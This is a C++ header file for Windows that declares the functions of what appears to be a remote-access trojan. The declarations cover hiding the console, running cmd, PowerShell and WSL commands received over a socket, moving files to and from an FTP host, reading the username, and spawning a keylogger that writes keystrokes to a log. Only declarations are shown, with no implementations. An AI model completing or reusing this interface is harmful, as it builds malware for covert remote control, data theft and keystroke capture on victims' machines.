#pragma once

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#include <sys/types.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <errno.h>
#include <string.h>
#include <direct.h>
#include <stdexcept>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h> //-lwininet
#include <windows.h>
#include <lmcons.h>
#include <string>
#include <fstream>

using namespace std;

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")

void hello_world(void);
char * raw_input(char *input_string);
int input(char *input_string);
void clear(void);
int substring_in_string(char *substring,char *string);
void print(char *string);
TCHAR *get_username();
int check_dir(char *pathname);
int tchar_substring_in_string(char *substring,TCHAR *string);
int StartsWith(const char *a, const char *b);
void hide_console(void);
void sleep(int number);
int connect(SOCKET socks_instance,struct sockaddr_in session);
int send(SOCKET socks_instance,char *buffer);
int recv(SOCKET socks_instance,char *buffer,int len);
void cmd_command(SOCKET socks_instance,char *command);
void powershell_command(SOCKET socks_instance,char*command);
void wsl_command(SOCKET socks_instance,char *command);
void execute_process(SOCKET socks_instance,char *process);
void execute_cmd(SOCKET socks_instance);
void execute_powershell(SOCKET socks_instance);
int download_to_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass);
int cd(char* path);
int download_on_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass);
void WriteLog(string filename, const char* key);
void WriteLogChar(string filename, char key);
int keylistener(string FILENAME_LOG, int key);
int keylogger_spawn(string FILENAME_LOG);
